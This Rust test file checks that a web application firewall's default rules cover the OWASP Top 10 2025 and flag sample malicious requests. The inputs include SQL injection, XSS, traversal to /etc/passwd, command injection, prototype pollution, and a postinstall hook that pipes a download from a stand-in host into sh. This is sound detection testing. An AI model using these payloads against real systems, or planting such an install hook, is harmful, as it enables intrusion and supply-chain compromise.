use std::collections::BTreeSet;

use super::super::{builtin_rules, load_rule_set_with_report, RequestParts, RuleTarget};
use crate::config::RuleSettings;

fn inspect(parts: &RequestParts<'_>) -> Vec<crate::rules::RuleMatch> {
    let rule_set = load_rule_set_with_report(&RuleSettings::default()).unwrap().0;
    rule_set.inspect(parts)
}

#[test]
fn default_rules_cover_all_owasp_top_10_2025_categories() {
    let categories = builtin_rules()
        .unwrap()
        .into_iter()
        .filter_map(|rule| rule.owasp_category)
        .map(|category| {
            category
                .split_once('-')
                .map(|(id, _)| id.to_string())
                .unwrap_or(category)
        })
        .collect::<BTreeSet<_>>();

    let expected = BTreeSet::from([
        "A01:2025".to_string(),
        "A02:2025".to_string(),
        "A03:2025".to_string(),
        "A04:2025".to_string(),
        "A05:2025".to_string(),
        "A06:2025".to_string(),
        "A07:2025".to_string(),
        "A08:2025".to_string(),
        "A09:2025".to_string(),
        "A10:2025".to_string(),
    ]);

    assert_eq!(categories, expected);
}

#[test]
fn default_rule_packs_declare_owasp_2025_standard_metadata() {
    let (_rule_set, report) = load_rule_set_with_report(&RuleSettings::default()).unwrap();

    assert_eq!(report.standards, vec!["owasp-top-10:2025"]);
    assert!(report
        .files
        .iter()
        .all(|file| file.standards == vec!["owasp-top-10:2025"]));
}

#[test]
fn detects_sql_injection() {
    let matches = inspect(&RequestParts {
        query: "q=' OR 1=1--",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-SQLI-001");
}

#[test]
fn detects_percent_encoded_sql_injection() {
    let matches = inspect(&RequestParts {
        query: "id=1'%20OR%201=1",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-SQLI-001");
}

#[test]
fn treats_plus_as_space_in_query_strings() {
    let matches = inspect(&RequestParts {
        query: "id=1'+OR+1=1",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-SQLI-001");
}

#[test]
fn detects_xss() {
    let matches = inspect(&RequestParts {
        query: "text=<script>alert(1)</script>",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-XSS-001");
}

#[test]
fn detects_path_traversal() {
    let matches = inspect(&RequestParts {
        path: "/download/../../../../etc/passwd",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-PATH-001");
}

#[test]
fn detects_path_traversal_in_query_string() {
    let matches = inspect(&RequestParts {
        query: "file=../../../../etc/passwd",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-PATH-002");
    assert_eq!(matches[0].matched_target, RuleTarget::Query);
}

#[test]
fn detects_command_injection() {
    let matches = inspect(&RequestParts {
        query: "cmd=whoami; cat /etc/passwd",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-CMD-001");
}

#[test]
fn detects_supply_chain_install_script_payload() {
    let matches = inspect(&RequestParts {
        body: r#"{"scripts":{"postinstall":"curl https://example.invalid/i.sh | sh"}}"#,
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-SC-001");
    assert_eq!(
        matches[0].owasp_category.as_deref(),
        Some("A03:2025-Software Supply Chain Failures")
    );
}

#[test]
fn detects_insecure_forwarded_protocol() {
    let matches = inspect(&RequestParts {
        headers: "x-forwarded-proto: http",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-CRYPTO-001");
}

#[test]
fn detects_method_override_design_risk() {
    let matches = inspect(&RequestParts {
        headers: "x-http-method-override: delete",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-DESIGN-001");
}

#[test]
fn detects_auth_secret_in_url() {
    let matches = inspect(&RequestParts {
        query: "password=secret",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-AUTH-002");
}

#[test]
fn detects_integrity_failure_payloads() {
    let matches = inspect(&RequestParts {
        body: r#"{"__proto__":{"admin":true}}"#,
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-INTEGRITY-001");
}

#[test]
fn detects_log_injection_payloads() {
    let matches = inspect(&RequestParts {
        query: "name=alice%0aERROR status=500",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-LOG-001");
}

#[test]
fn detects_exceptional_condition_payloads() {
    let matches = inspect(&RequestParts {
        query: "file=%00",
        ..RequestParts::default()
    })
    .unwrap();

    assert_eq!(matches[0].rule_id, "SAUGRA-EXC-001");
}
